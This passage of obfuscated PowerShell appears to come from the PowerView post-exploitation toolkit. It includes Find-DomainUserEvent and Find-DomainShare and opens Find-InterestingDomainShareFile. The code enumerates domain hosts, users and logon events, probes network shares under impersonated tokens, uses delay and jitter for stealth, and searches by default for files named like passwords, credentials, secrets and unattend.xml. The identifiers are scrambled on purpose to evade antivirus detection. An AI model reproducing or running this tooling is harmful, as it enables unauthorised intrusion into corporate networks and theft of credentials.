        if (${pSBO`Un`Dp`Ar`AmEt`ERS}[("{2}{0}{1}" -f 'ultPageSi','ze','Res')]) { ${usersE`ARCHEr`AR`g`UmentS}[("{2}{1}{3}{0}{4}"-f 'z','sultPag','Re','eSi','e')] = ${Re`su`LtpA`GESizE} }
        if (${Ps`B`OunDpar`AmE`TERs}[("{1}{0}{3}{2}" -f'erverTi','S','eLimit','m')]) { ${USE`RsEAR`c`hE`RarGU`MeN`TS}[("{0}{2}{3}{1}{4}"-f 'ServerTi','imi','me','L','t')] = ${sErVERTiM`e`L`IMIT} }
        if (${PsBO`UNDpaR`Am`Eters}[("{0}{1}{2}" -f 'To','mbst','one')]) { ${UsErsEa`RCH`E`RaRg`Ume`N`Ts}[("{1}{0}{2}"-f'm','To','bstone')] = ${TOM`B`Sto`NE} }
        if (${psBOUnD`P`A`R`AMeTErS}[("{2}{0}{1}" -f'n','tial','Crede')]) { ${u`Se`R`SeAr`CH`eRA`RgUmentS}[("{1}{2}{0}"-f'ial','Crede','nt')] = ${CREDEN`T`iAl} }

        if (${PsbOuNDparA`M`ETE`RS}[("{0}{1}{3}{2}" -f 'UserI','de','ty','nti')] -or ${pSBO`UNd`P`Ara`me`Ters}[("{0}{2}{1}" -f 'U','ter','serLDAPFil')] -or ${PSbOUN`DparAM`et`ERS}[("{1}{2}{0}"-f'rchBase','UserSe','a')] -or ${Ps`Bou`NDP`ARa`mETERS}[("{2}{1}{0}{3}{4}"-f'nCou','rAdmi','Use','n','t')]) {
            ${ta`Rg`EtuS`eRS} = &("{3}{0}{1}{2}" -f'et-Domai','n','User','G') @UserSearcherArguments | &("{2}{3}{1}{0}"-f'Object','t-','Se','lec') -ExpandProperty ("{4}{1}{0}{2}{3}"-f 'u','o','ntnam','e','samacc')
        }
        elseif (${psboU`N`dparAmEte`Rs}[("{3}{2}{1}{0}"-f'dentity','upI','serGro','U')] -or (-not ${P`S`BOUN`Dpa`RA`MeTerS}[("{0}{1}"-f 'Fil','ter')])) {
            
            ${GroUP`s`e`Arc`HE`Ra`RGUMENts} = @{
                ("{1}{2}{0}" -f'ty','Iden','ti') = ${uSergr`ouPi`dE`NtITY}
                ("{1}{0}" -f'ecurse','R') = ${t`RUe}
            }
            &("{4}{1}{2}{3}{0}"-f'se','ri','te-Ve','rbo','W') ('U'+'serGroupIden'+'t'+'i'+'ty:'+' '+"$UserGroupIdentity")
            if (${psboU`Nd`PArAmET`ERS}[("{0}{1}{2}"-f'U','serD','omain')]) { ${GR`oU`PseaRC`hE`RargU`Me`Nts}[("{0}{1}"-f'D','omain')] = ${uSERDo`mA`in} }
            if (${PsBOu`Nd`pAR`AME`TErS}[("{0}{3}{2}{1}"-f 'User','ase','archB','Se')]) { ${GROupSEAR`cHEr`AR`guMen`Ts}[("{1}{0}{2}"-f'h','Searc','Base')] = ${uSE`RSEA`Rc`hBASe} }
            if (${PsBOU`N`DpA`R`AMe`TERS}[("{2}{1}{0}" -f'r','rve','Se')]) { ${Gr`oUPs`eArChEr`AR`Gu`m`e`Nts}[("{1}{2}{0}"-f'er','S','erv')] = ${S`ER`VEr} }
            if (${PSBOu`NdpARam`ET`ers}[("{1}{2}{0}"-f 'hScope','Se','arc')]) { ${G`Ro`U`psEarcHEraR`Gumen`Ts}[("{1}{0}{2}"-f'co','SearchS','pe')] = ${S`EArCH`s`CoPe} }
            if (${psbOUN`d`p`A`RameteRs}[("{0}{1}{3}{2}"-f'Re','s','ageSize','ultP')]) { ${GROU`p`se`AR`ChE`RaRGUMeNTS}[("{2}{1}{3}{0}{4}" -f'g','sultP','Re','a','eSize')] = ${r`EsU`LtPagESi`zE} }
            if (${PSbOU`NDpA`R`AmE`TeRS}[("{3}{4}{2}{1}{0}"-f't','meLimi','rTi','Se','rve')]) { ${grOUpSEa`R`Ch`eRaRgu`M`eNts}[("{2}{1}{0}" -f 'TimeLimit','er','Serv')] = ${s`e`RverTImeLimIt} }
            if (${P`SBou`ND`PAram`ETers}[("{0}{1}{2}" -f 'Tom','bston','e')]) { ${groUP`S`eARCHe`RA`RGu`Me`NTS}[("{2}{1}{0}" -f 'e','ombston','T')] = ${TOm`BsT`ONE} }
            if (${Psb`O`U`NdP`ARAMete`Rs}[("{1}{0}{2}{3}"-f'e','Cr','dentia','l')]) { ${gR`OuPs`E`ArCH`ERa`R`GumENtS}[("{1}{0}{2}" -f 't','Creden','ial')] = ${creDe`N`Ti`Al} }
            ${TaRG`E`Tus`ers} = &("{1}{2}{3}{0}" -f 'r','Get-DomainGroupM','em','be') @GroupSearcherArguments | &("{2}{0}{1}{3}"-f 'l','ect-Obj','Se','ect') -ExpandProperty ("{2}{1}{0}"-f 'me','a','MemberN')
        }

        
        if (${p`sbOu`NDPAramete`Rs}[("{0}{2}{1}{3}"-f 'C','mputerNam','o','e')]) {
            ${TAR`GEtCOMPU`T`ERS} = ${COm`pU`T`ErName}
        }
        else {
            
            ${Dc`seARCheR`AR`GUmeN`Ts} = @{
                ("{0}{1}"-f'LD','AP') = ${T`RuE}
            }
            if (${pSBOundPAR`AMeT`e`Rs}[("{1}{0}" -f'omain','D')]) { ${dC`sEaR`c`H`ERARgumEntS}[("{0}{1}" -f 'D','omain')] = ${DOM`A`In} }
            if (${PSbou`ND`pa`R`A`meTeRs}[("{0}{1}" -f'Ser','ver')]) { ${d`cSeAr`ch`eR`A`RgUMeNTS}[("{0}{1}"-f 'Serv','er')] = ${s`ERV`er} }
            if (${psBo`UN`D`ParAmE`T`Ers}[("{0}{1}{2}" -f 'Cr','edenti','al')]) { ${dc`SeAr`cHeraR`G`U`M`enTs}[("{0}{2}{1}" -f 'Cr','dential','e')] = ${cREdE`N`TI`Al} }
            &("{1}{0}{3}{2}"-f 'rite-','W','rbose','Ve') ('[Fi'+'nd-Dom'+'ainUse'+'rE'+'v'+'ent]'+' '+'Q'+'ue'+'rying '+'for'+' '+'domain'+' '+'co'+'ntroll'+'e'+'rs '+'in'+' '+'doma'+'in: '+"$Domain")
            ${tA`RgEtcOMPU`Te`Rs} = &("{0}{2}{3}{1}" -f 'Ge','nController','t-Do','mai') @DCSearcherArguments | &("{3}{4}{1}{0}{2}"-f'Obj','ct-','ect','Sel','e') -ExpandProperty ("{2}{0}{1}{3}"-f 'hos','tna','dns','me')
        }
        if (${t`ARG`eT`c`OmpUt`erS} -and (${tArg`E`TcO`mpu`TErS} -isnot [System.Array])) {
            ${TA`R`GeTc`OmPUtERS} = @(,${T`AR`gE`TC`OmpuTeRs})
        }
        &("{2}{1}{0}" -f'-Verbose','ite','Wr') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        &("{3}{2}{0}{1}"-f 'e-Verb','ose','rit','W') ('[Find-'+'Dom'+'a'+'inUse'+'rEvent] '+'T'+'ar'+'getComputers'+' '+"$TargetComputers")
        if (${TA`RgEt`CoM`puTerS}."lEn`gTH" -eq 0) {
            throw ("{8}{4}{0}{11}{2}{5}{3}{12}{1}{9}{7}{6}{10}" -f 'nUse','un','en','t','nd-Domai','t] No hos','o enumerat',' t','[Fi','d','e','rEv','s fo')
        }

        
        ${ho`sTeNUMb`L`oCK} = {
            Param(${CoM`P`UterN`Ame}, ${s`Tart`TIme}, ${eND`T`imE}, ${M`AX`e`Vents}, ${T`ARg`e`TusErs}, ${fil`T`ER}, ${cre`de`N`TIAl})

            ForEach (${tARgEt`COM`PuTER} in ${COMPUt`E`Rn`Ame}) {
                ${uP} = &("{2}{0}{4}{3}{1}"-f 'est','on','T','nnecti','-Co') -Count 1 -Quiet -ComputerName ${tARge`Tco`MPu`T`ER}
                if (${uP}) {
                    ${DoMAiNU`SEReVEn`T`ArgS} = @{
                        ("{0}{1}{2}" -f 'Comput','e','rName') = ${T`ARge`TCoMpUt`Er}
                    }
                    if (${Sta`R`TtIme}) { ${DO`mai`NuSE`REVEn`TA`Rgs}[("{2}{0}{1}" -f 'm','e','StartTi')] = ${sTaR`T`TIme} }
                    if (${enD`TI`ME}) { ${domAinU`Se`ReVe`N`TArgs}[("{1}{2}{0}" -f'ime','E','ndT')] = ${E`NDti`ME} }
                    if (${MA`Xe`VE`NtS}) { ${D`O`mAInUseReV`e`NT`ArGS}[("{2}{1}{0}"-f'ents','axEv','M')] = ${maxe`Ve`NtS} }
                    if (${C`REDEnt`IAL}) { ${doM`AiNusEREveN`Tar`gs}[("{1}{0}{3}{2}"-f 'eden','Cr','al','ti')] = ${crE`d`eNTIaL} }
                    if (${Fi`Lter} -or ${t`ARG`EtuseRS}) {
                        if (${T`A`RgEtUsErs}) {
                            &("{4}{1}{0}{2}{3}" -f'erEve','ainUs','n','t','Get-Dom') @DomainUserEventArgs | &("{2}{0}{3}{1}"-f'-Obje','t','Where','c') {${taRGe`T`USe`Rs} -contains ${_}."targe`T`UsE`R`NAmE"}
                        }
                        else {
                            ${OPEr`AT`Or} = 'or'
                            ${F`ILter}."ke`YS" | &("{2}{3}{1}{0}" -f'ject','ach-Ob','F','orE') {
                                if ((${_} -eq 'Op') -or (${_} -eq ("{0}{1}{2}" -f 'O','perat','or')) -or (${_} -eq ("{0}{1}{2}" -f 'Opera','tio','n'))) {
                                    if ((${FI`lter}[${_}] -match '&') -or (${F`iL`Ter}[${_}] -eq 'and')) {
                                        ${Op`ER`At`Or} = 'and'
                                    }
                                }
                            }
                            ${k`EyS} = ${F`IlteR}."K`EYS" | &("{2}{0}{3}{1}"-f 'er','ct','Wh','e-Obje') {(${_} -ne 'Op') -and (${_} -ne ("{0}{2}{1}"-f'Oper','tor','a')) -and (${_} -ne ("{2}{1}{0}" -f 'on','ti','Opera'))}
                            &("{3}{1}{4}{2}{0}"-f 't','t-Do','ven','Ge','mainUserE') @DomainUserEventArgs | &("{0}{1}{3}{2}{4}"-f 'For','E','c','ach-Obje','t') {
                                if (${oP`e`RA`TOR} -eq 'or') {
                                    ForEach (${K`ey} in ${K`eYs}) {
                                        if (${_}."$Key" -match ${fILT`Er}[${K`ey}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach (${k`eY} in ${k`eyS}) {
                                        if (${_}."$Key" -notmatch ${f`Ilt`eR}[${k`ey}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &("{4}{2}{1}{3}{0}"-f 'nt','nUs','ai','erEve','Get-Dom') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${PSBOund`Pa`RA`MEtErS}[("{0}{1}"-f 'Dela','y')] -or ${P`SbO`UN`Dp`ARamET`eRs}[("{0}{3}{1}{2}"-f'S','opO','nSuccess','t')]) {

            &("{2}{3}{0}{1}" -f'o','se','W','rite-Verb') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            &("{0}{1}{3}{2}"-f'W','rit','e','e-Verbos') ('[F'+'ind-D'+'om'+'ai'+'nU'+'serEvent]'+' '+'Delay'+': '+"$Delay, "+'J'+'itter'+': '+"$Jitter")
            ${C`OuNT`ER} = 0
            ${rA`NdnO} = &("{0}{2}{1}"-f'Ne','ct','w-Obje') ("{1}{3}{2}{0}"-f'm','System','do','.Ran')

            ForEach (${TaRGE`T`comp`UTER} in ${t`AR`GETCOm`Pute`RS}) {
                ${c`OUn`TEr} = ${cOu`Nt`Er} + 1

                
                &("{1}{0}{2}"-f'-S','Start','leep') -Seconds ${R`An`dnO}.("{0}{1}"-f'Ne','xt').Invoke((1-${JiT`TER})*${de`lay}, (1+${jiTT`ER})*${D`elay})

                &("{3}{1}{2}{0}" -f 'bose','t','e-Ver','Wri') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${r`eS`UlT} = &("{0}{3}{1}{2}"-f'Invoke-','m','and','Com') -ScriptBlock ${H`O`StEN`U`MBLoCk} -ArgumentList ${taR`ge`TCOM`Put`Er}, ${S`Tar`TTime}, ${end`T`ime}, ${mA`Xev`EnTS}, ${TArGetU`sE`RS}, ${Fi`l`TER}, ${Cr`eD`EN`TIAL}
                ${RE`S`Ult}

                if (${rEs`Ult} -and ${sTo`ponSUCc`ESs}) {
                    &("{1}{2}{3}{0}"-f'se','W','rite-V','erbo') ("{13}{7}{11}{15}{5}{12}{0}{14}{16}{4}{2}{1}{6}{8}{9}{3}{10}" -f ']',' found,','r','g ear','rget use','erEven',' re','-','tu','rnin','ly','Dom','t','[Find',' ','ainUs','Ta')
                    return
                }
            }
        }
        else {
            &("{1}{0}{2}"-f'bo','Write-Ver','se') ('[Fin'+'d-DomainUs'+'e'+'rEven'+'t] '+'Usin'+'g '+'th'+'readin'+'g '+'wit'+'h '+'th'+'reads:'+' '+"$Threads")

            
            ${SCrI`pt`Para`Ms} = @{
                ("{2}{0}{1}" -f'rtT','ime','Sta') = ${st`AR`Ttime}
                ("{0}{1}" -f 'EndTi','me') = ${enD`Ti`ME}
                ("{1}{0}"-f 'ts','MaxEven') = ${Ma`XE`VEntS}
                ("{0}{2}{1}"-f'Targ','rs','etUse') = ${t`Ar`gEtUse`RS}
                ("{1}{0}" -f'ter','Fil') = ${FI`lTER}
                ("{0}{2}{3}{1}" -f 'Cr','al','eden','ti') = ${crEDE`N`Tial}
            }

            
            &("{1}{2}{3}{5}{0}{4}" -f'io','Ne','w-Th','readed','n','Funct') -ComputerName ${ta`Rgetc`OMpu`T`eRS} -ScriptBlock ${Hos`TEnu`MBLO`CK} -ScriptParameters ${sc`R`iP`T`PaRAMs} -Threads ${tHR`ea`DS}
        }
    }
}


function fIN`d-`do`mA`in`sHAre {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f 'SShouldP','P','ess','roc'}, '')]
    [OutputType({"{0}{3}{1}{4}{2}" -f 'Pow','i','areInfo','erV','ew.Sh'})]
    Param(
        [Parameter(PosITION = 0, VALuefroMPipELinE = ${Tr`Ue}, vALUEFRomPIPElinebypRoPErtYName = ${t`RuE})]
        [Alias({"{1}{2}{0}{3}" -f 'SHos','D','N','tName'})]
        [String[]]
        ${C`om`PuTEr`Na`ME},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Domai','n'})]
        [String]
        ${cOmpuTe`R`dOMaIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMpUT`eR`LD`A`pFilTEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`M`Pu`Te`RsearCHBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{0}"-f 'stem','Opera','Sy','ting'})]
        [String]
        ${Co`M`PuteROpEra`TINgSysT`em},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'Ser','vic','ePack'})]
        [String]
        ${C`oMPU`TErSeRv`ICepack},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'Site','ame','N'})]
        [String]
        ${comP`U`TeR`sitEnAME},

        [Alias({"{1}{0}{2}"-f'es','CheckAcc','s'})]
        [Switch]
        ${C`h`Eck`shaREACceSs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{4}{5}{2}" -f 'ontro','Dom','r','ainC','ll','e'})]
        [String]
        ${se`R`VeR},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{2}{1}{0}"-f 'vel','e','OneL'}, {"{0}{1}"-f'S','ubtree'})]
        [String]
        ${seAR`chScO`pE} = ("{1}{0}" -f 'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESuLT`P`AgES`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErv`ERt`iMEli`MiT},

        [Switch]
        ${ToM`BsT`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`d`Ential} =   (  &("{3}{1}{0}{2}" -f'T-C','E','hIldITem','g') ('v'+'AriA'+'ble:JH3X'+'O6'))."val`Ue"::"eM`pTY",

        [ValidateRange(1, 10000)]
        [Int]
        ${D`elay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jITt`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${THr`e`ADs} = 20
    )

    BEGIN {

        ${C`omPu`TeR`sEarCH`E`R`Arg`UMEntS} = @{
            ("{0}{3}{2}{1}" -f 'Prope','s','e','rti') = ("{0}{2}{1}"-f 'dns','name','host')
        }
        if (${pSboun`dp`ArA`ME`Ters}[("{2}{1}{0}"-f 'terDomain','ompu','C')]) { ${Co`mpuTerSeA`R`chE`Rarg`UMEnts}[("{1}{0}{2}"-f 'm','Do','ain')] = ${CO`m`Pu`TE`RDOMAiN} }
        if (${PS`BoUNd`PAraMEt`E`Rs}[("{2}{3}{0}{1}" -f 'Filte','r','C','omputerLDAP')]) { ${CoMPuT`ERseA`RC`h`era`RgumE`N`TS}[("{1}{2}{0}"-f'Filter','LDA','P')] = ${COM`p`U`TerlDapFiLt`ER} }
        if (${Ps`B`OuNDpA`RamEte`RS}[("{0}{1}{2}{3}" -f 'Compute','r','Sear','chBase')]) { ${COMPU`T`eRSeaRC`He`R`ARgu`Me`NTs}[("{2}{0}{1}" -f'c','hBase','Sear')] = ${cOm`pUterSe`ARcHBA`sE} }
        if (${PsboUND`P`ArAm`ete`RS}[("{1}{0}{2}{3}" -f 'const','Un','rain','ed')]) { ${C`om`pUTer`SEA`RcHer`ARGumEn`TS}[("{1}{2}{0}{3}" -f'straine','Unco','n','d')] = ${uNco`NstR`AIneD} }
        if (${ps`Bound`paRa`m`e`TerS}[("{0}{2}{1}{3}{5}{4}" -f 'Com','perati','puterO','ngSyst','m','e')]) { ${Co`mp`Uters`eARcHERarGUMe`NtS}[("{1}{0}{2}{3}"-f'g','Operatin','Syst','em')] = ${O`pe`RaTiN`gs`YSTEm} }
        if (${Ps`BoUnD`Pa`Ramet`eRs}[("{1}{0}{3}{2}" -f 'ceP','ComputerServi','k','ac')]) { ${com`Pute`RsEA`R`chErar`guM`EnTS}[("{0}{1}{2}"-f 'Ser','v','icePack')] = ${seR`VicEpa`CK} }
        if (${p`sBOU`NDp`A`RameTeRS}[("{1}{0}{3}{2}" -f'm','Co','iteName','puterS')]) { ${c`omp`UtE`Rs`E`ArcHerAr`G`U`MENts}[("{2}{0}{1}"-f'Nam','e','Site')] = ${sITE`NA`me} }
        if (${P`sBoU`NdP`ARamE`TERS}[("{1}{0}" -f 'rver','Se')]) { ${c`o`m`pUTErseARC`hERArgUmE`NtS}[("{1}{0}{2}"-f 'e','Serv','r')] = ${SE`RvEr} }
        if (${p`SbOunDPAr`AM`EtERs}[("{3}{2}{1}{0}"-f 'pe','Sco','ch','Sear')]) { ${cO`mpUtERSeArCh`ErarG`UmEn`Ts}[("{2}{0}{1}{3}" -f'hS','cop','Searc','e')] = ${S`EARc`hsCOpe} }
        if (${p`sBo`UnDparAMe`TeRS}[("{3}{2}{1}{0}"-f 'ze','geSi','a','ResultP')]) { ${COMPU`TERSE`A`RChERArGUM`eN`Ts}[("{2}{1}{0}{3}"-f 'ageS','sultP','Re','ize')] = ${rESultP`AG`e`SiZE} }
        if (${psBo`U`NDPAR`AmETeRs}[("{2}{0}{3}{1}"-f 'verTi','t','Ser','meLimi')]) { ${c`O`M`PUte`RsE`A`RcherArG`UMEnTS}[("{1}{0}{2}{4}{3}" -f 'rver','Se','TimeL','it','im')] = ${serveRt`i`mel`iM`It} }
        if (${psBOuNdPAr`A`met`ers}[("{1}{0}{2}"-f'ombsto','T','ne')]) { ${Co`mP`UtErseARCHeRaR`G`U`MENTS}[("{1}{2}{0}{3}" -f'mbs','T','o','tone')] = ${t`ombStO`NE} }
        if (${PSb`oUND`ParAMet`e`RS}[("{1}{0}{3}{2}"-f'r','C','al','edenti')]) { ${CoMp`UteRsea`RCHEr`ARgu`mentS}[("{2}{0}{1}" -f 'en','tial','Cred')] = ${CREd`E`NTial} }

        if (${pS`BOUNDPar`AmE`Te`RS}[("{3}{1}{2}{0}" -f 'ame','ompu','terN','C')]) {
            ${TArGe`TC`O`M`puTers} = ${ComPU`Ter`N`AMe}
        }
        else {
            &("{0}{1}{2}" -f'Write-','Verbo','se') ("{9}{5}{2}{12}{4}{0}{10}{6}{13}{3}{7}{11}{8}{1}"-f' Q','n','o',' comput','e]','nd-D','r','ers i',' domai','[Fi','ue','n the','mainShar','ying')
            ${TArGetCOm`p`UT`eRS} = &("{1}{2}{4}{3}{0}" -f 'ter','Ge','t-Domain','ompu','C') @ComputerSearcherArguments | &("{0}{1}{2}"-f'S','e','lect-Object') -ExpandProperty ("{0}{1}{3}{2}" -f'dn','shost','ame','n')
        }
        &("{0}{3}{1}{2}{4}" -f'Wr','t','e-Verbo','i','se') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if (${TaRgE`TC`O`mpu`TeRS}."LEN`g`TH" -eq 0) {
            throw ("{2}{1}{7}{8}{0}{9}{13}{6}{5}{4}{3}{10}{11}{12}" -f 'in','in','[F','nu','d to e','un','s fo','d-Dom','a','Share] N','m','erat','e','o host')
        }

        
        ${HOS`TE`N`UMblO`ck} = {
            Param(${com`PUT`e`R`NaME}, ${c`he`CKS`harE`AccEsS}, ${TokE`NH`Andle})

            if (${T`okENHAN`DLe}) {
                
                ${n`ULL} = &("{3}{1}{4}{2}{0}" -f'on','oke-User','onati','Inv','Impers') -TokenHandle ${TO`kEn`hanDLE} -Quiet
            }

            ForEach (${T`Ar`G`EtcOMPUT`eR} in ${C`OMPut`erN`AMe}) {
                ${uP} = &("{1}{2}{0}"-f 'onnection','Test','-C') -Count 1 -Quiet -ComputerName ${TAr`gEt`cOMpUT`er}
                if (${UP}) {
                    
                    ${sh`A`RES} = &("{0}{2}{3}{1}"-f'Get-','e','N','etShar') -ComputerName ${Ta`R`GeT`c`oMPUTer}
                    ForEach (${Sh`ARE} in ${sh`ARes}) {
                        ${s`HAREN`AME} = ${S`H`ArE}."n`AME"
                        
                        ${pA`TH} = '\\'+${TaRGeT`C`OMp`UTer}+'\'+${S`h`ARe`NAMe}

                        if ((${Sha`ReNa`mE}) -and (${shAR`e`Name}.("{1}{0}"-f 'im','tr').Invoke() -ne '')) {
                            
                            if (${c`he`c`KsH`A`ReAcCESS}) {
                                
                                try {
                                    ${Nu`ll} =   (&("{0}{1}"-f'g','cI') ('v'+'aRIAbLe:'+'R4f3'+'t'+'z') )."v`ALue"::("{1}{2}{0}"-f'es','Get','Fil').Invoke(${p`Ath})
                                    ${S`hAre}
                                }
                                catch {
                                    &("{0}{1}{3}{2}"-f 'Write','-Verbo','e','s') ('Error'+' '+'accessi'+'ng'+' '+'share'+' '+'p'+'ath '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                ${S`haRe}
                            }
                        }
                    }
                }
            }

            if (${t`oKEnha`ND`Le}) {
                &("{2}{5}{6}{0}{3}{4}{1}" -f 'e-','lf','I','RevertToS','e','nv','ok')
            }
        }

        ${LOG`ON`TO`KeN} = ${N`ULl}
        if (${pSB`oUN`DpARA`Me`T`erS}[("{2}{1}{0}" -f 'dential','re','C')]) {
            if (${psBouNdpA`RamET`E`Rs}[("{1}{0}" -f'elay','D')] -or ${psBo`U`NDPARa`mete`Rs}[("{4}{2}{0}{3}{1}"-f'OnSu','ess','top','cc','S')]) {
                ${LoG`o`NT`OkEN} = &("{5}{0}{3}{4}{2}{1}"-f 'ke-UserImpe','ion','at','rs','on','Invo') -Credential ${credE`N`T`IAl}
            }
            else {
                ${L`ogO`NtOKEN} = &("{0}{3}{6}{4}{2}{1}{5}"-f'In','person','Im','voke-','er','ation','Us') -Credential ${c`RE`D`eNtiaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${P`sbouNd`p`ArameT`eRS}[("{1}{0}"-f 'y','Dela')] -or ${p`sBounDpaRAmE`TE`RS}[("{2}{1}{0}{3}"-f 'opOnS','t','S','uccess')]) {

            &("{1}{0}{2}"-f 'rite-Ve','W','rbose') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            &("{1}{2}{0}"-f'e-Verbose','Wri','t') ('[Find'+'-Dom'+'ain'+'Share]'+' '+'D'+'elay: '+"$Delay, "+'Jitt'+'er'+': '+"$Jitter")
            ${C`OU`NteR} = 0
            ${rANd`NO} = &("{2}{3}{0}{1}"-f 'b','ject','New','-O') ("{1}{0}{2}" -f'.','System','Random')

            ForEach (${TArgETCo`Mp`Uter} in ${tarGetCom`pU`TErs}) {
                ${Co`UNt`er} = ${c`ouN`Ter} + 1

                
                &("{1}{0}{2}" -f 't-','Star','Sleep') -Seconds ${Ra`NDno}.("{0}{1}" -f 'N','ext').Invoke((1-${JITT`er})*${D`eLAY}, (1+${J`itteR})*${D`el`Ay})

                &("{0}{2}{1}"-f'Wri','e','te-Verbos') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{3}{0}{4}{1}{2}"-f 'v','mma','nd','In','oke-Co') -ScriptBlock ${ho`s`TenUMBLO`Ck} -ArgumentList ${TAr`gETCOMP`Ut`ER}, ${c`heCk`sHA`R`Eac`cesS}, ${LOGOntO`k`en}
            }
        }
        else {
            &("{2}{0}{1}" -f'-Verb','ose','Write') ('[Find-D'+'omai'+'n'+'S'+'hare] '+'Usi'+'n'+'g '+'threa'+'ding'+' '+'with'+' '+'threa'+'d'+'s: '+"$Threads")

            
            ${sCrIpT`P`ARAmS} = @{
                ("{2}{3}{1}{0}{5}{4}" -f'ar','Sh','C','heck','ess','eAcc') = ${C`he`c`KSHaRE`AC`cess}
                ("{0}{2}{1}" -f 'TokenHa','le','nd') = ${lo`Gont`Oken}
            }

            
            &("{3}{0}{1}{2}"-f 'w-Th','readedFunc','tion','Ne') -ComputerName ${TarGE`T`cOMp`Ut`ErS} -ScriptBlock ${hOs`Ten`UMB`LOck} -ScriptParameters ${sC`RiPtPAR`AMs} -Threads ${T`hrEa`DS}
        }
    }

    END {
        if (${loGon`TOK`En}) {
            &("{0}{3}{5}{2}{1}{4}" -f 'Invoke','tT','er','-R','oSelf','ev') -TokenHandle ${LogOn`TO`K`EN}
        }
    }
}


function Find`-intE`RES`TingdOmaINsHa`REfI`lE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f'oces','PSShoul','dPr','s'}, '')]
    [OutputType({"{2}{4}{0}{1}{5}{3}" -f'ew.F','oundFi','Po','e','werVi','l'})]
    [CmdletBinding(DEFAuLtparameteRsEtname = {"{4}{5}{3}{0}{2}{1}" -f 'c','n','atio','pecifi','Fil','eS'})]
    Param(
        [Parameter(posItIon = 0, VALuEFrompiPELine = ${TR`UE}, vALUEfrOMpiPELINEbYPRoPErTYnamE = ${T`Rue})]
        [Alias({"{2}{0}{3}{1}" -f 'NS','e','D','HostNam'})]
        [String[]]
        ${C`omPu`T`ERNaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Co`mPuTErdo`ma`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mPUTE`RLdApFil`TEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMp`Ut`Er`SearcHbase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}" -f 'O','System','pera','ting'})]
        [String]
        ${c`oMPuteR`O`PEr`At`in`GSyStem},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'ck','Pa','Service'})]
        [String]
        ${c`Om`P`UTeRsEr`V`iC`epacK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'e','SiteN','am'})]
        [String]
        ${cOMp`UteRsi`T`e`NAME},

        [Parameter(PArAMETERSEtNaME = "FiL`eSPE`CI`FiCAtI`oN")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}" -f'Sear','ch','Ter','ms'}, {"{1}{0}" -f 'erms','T'})]
        [String[]]
        ${inC`L`Ude} = @(("{1}{0}{2}"-f 'ssword','*pa','*'), ("{0}{1}{3}{2}"-f'*s','ensi','*','tive'), ("{1}{0}"-f 'in*','*adm'), ("{0}{1}{2}" -f'*l','og','in*'), ("{1}{0}"-f'*','*secret'), ("{0}{4}{3}{2}{1}"-f'unatt','ml','x','.','end*'), ("{1}{0}"-f'mdk','*.v'), ("{1}{0}" -f 'creds*','*'), ("{2}{0}{1}"-f 'dential','*','*cre'), ("{0}{1}{2}"-f'*.c','onf','ig')),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern({(("{4}{0}{2}{3}{1}"-f'2Z02','02Z','Z02','Z','0')) -cRepLAcE  '02Z',[cHar]92})]
        [Alias({"{0}{1}"-f'Shar','e'})]
        [String[]]
        ${ShAre`P`A`TH},

        [String[]]
        ${EXc`LU`dE`DsHAreS} = @('C$', ((('A'+'dminO'+'qN')  -CrEpLaCe'OqN',[cHaR]36)), (('Prin'+'t{0'+'}')  -F  [char]36), (('IP'+'C0un')."REpL`Ace"(([ChAR]48+[ChAR]117+[ChAR]110),'$'))),

        [Parameter(PAraMetERseTnaMe = "filesP`ec`ifIcat`ion")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LaS`T`AcceSstIMe},

        [Parameter(ParamETERSEtNAmE = "fILE`S`peCi`F`icA`Tion")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${L`As`Twr`iTeT`imE},

        [Parameter(PaRAmetErsETNamE = "FI`lESp`eCIFi`caTIOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${CrE`AT`Io`NTi`Me},

        [Parameter(ParAMEtErSeTNaMe = "OF`FICEdO`Cs")]
        [Switch]
        ${Of`FiC`Ed`OCs},

        [Parameter(paRameteRseTNaME = "f`RESH`exeS")]
        [Switch]
        ${fr`E`ShEXeS},

        [ValidateNotNullOrEmpty()]
